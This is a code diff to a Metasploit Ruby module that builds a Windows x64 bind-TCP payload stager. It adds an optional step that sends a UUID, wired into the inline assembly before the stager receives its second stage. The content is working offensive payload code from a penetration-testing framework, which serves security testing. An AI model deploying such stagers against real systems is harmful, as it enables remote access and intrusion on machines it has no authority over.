@@ -2,6 +2,7 @@
 
 require 'msf/core'
 require 'msf/core/payload/transport_config'
+require 'msf/core/payload/windows/x64/send_uuid'
 require 'msf/core/payload/windows/x64/block_api'
 require 'msf/core/payload/windows/x64/exitfunk'
 
@@ -17,6 +18,7 @@ module Payload::Windows::BindTcp_x64
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
+  include Msf::Payload::Windows::SendUUID_x64
   include Msf::Payload::Windows::BlockApi_x64
   include Msf::Payload::Windows::Exitfunk_x64
 
@@ -36,6 +38,14 @@ module Payload::Windows::BindTcp_x64
     end
 
     generate_bind_tcp(conf)
+  end
+
+  #
+  # By default, we don't want to send the UUID, but we'll send
+  # for certain payloads if requested.
+  #
+  def include_send_uuid
+    false
   end
 
   def transport_config(opts={})
@@ -149,7 +159,11 @@ module Payload::Windows::BindTcp_x64
         call rbp               ; closesocket( s );
         ; restore RSP so we dont have any alignment issues with the next block...
         add rsp, #{408+8+8*4+32*7} ; cleanup the stack allocations
+    ^
 
+    asm << asm_send_uuid if include_send_uuid
+
+    asm << %Q^
       recv:
         ; Receive the size of the incoming second stage...
         sub rsp, 16            ; alloc some space (16 bytes) on stack for to hold the second stage length
